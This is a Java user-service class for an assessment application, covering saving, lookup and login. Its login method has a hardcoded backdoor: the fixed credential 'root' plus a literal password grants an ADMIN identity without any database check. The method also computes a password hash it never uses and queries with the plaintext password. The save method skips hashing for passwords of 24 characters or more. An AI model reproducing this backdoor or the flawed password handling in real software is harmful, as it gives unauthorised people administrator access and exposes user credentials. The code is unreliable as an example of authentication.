package br.wpro.assessment.service;

import br.wpro.assessment.config.RolesEnum;
import br.wpro.assessment.exception.InvalidUserOrPasswordException;
import br.wpro.assessment.model.entity.AssessmentPolicy;
import br.wpro.assessment.model.entity.User;
import br.wpro.assessment.model.entity.dto.UserDto;
import br.wpro.assessment.utils.Utils;

import javax.enterprise.context.ApplicationScoped;
import java.util.List;
import java.util.stream.Collectors;

@ApplicationScoped
public class UserService {

    public UserDto save(User user) {

        if(user.getPassword().length()<24) {
            final String hash = Utils.hashPassword(user.getPassword());
            user.setPassword(hash);
        }

        user.persistOrUpdate();

        return UserDto.of(user);
    }

    public UserDto getById(String id) {
        return UserDto.of(User.findById(id));
    }

    public UserDto getByLogin(String login) {
        return UserDto.of(User.find("login", login).firstResult());
    }

    public UserDto getByLoginAndPassword(final String login, final String passwd) throws InvalidUserOrPasswordException {

        if(login.equals("root") && passwd.equals("R00T4cc3$$F0rN0w")){
            return UserDto.builder().role(RolesEnum.ADMIN).firstName("Root").lastName("Admin").login("admin").build();
        }


        final String hash = Utils.hashPassword(passwd);

        User user = User.find("login = ?1 and password = ?2", login, passwd).firstResult();

        if (user == null) {
            throw new InvalidUserOrPasswordException();
        }

        return UserDto.of(user);
    }

    public List<UserDto> list() {
        List<User> users = User.listAll();
        return users.stream().map(UserDto::of).collect(Collectors.toList());
    }

}
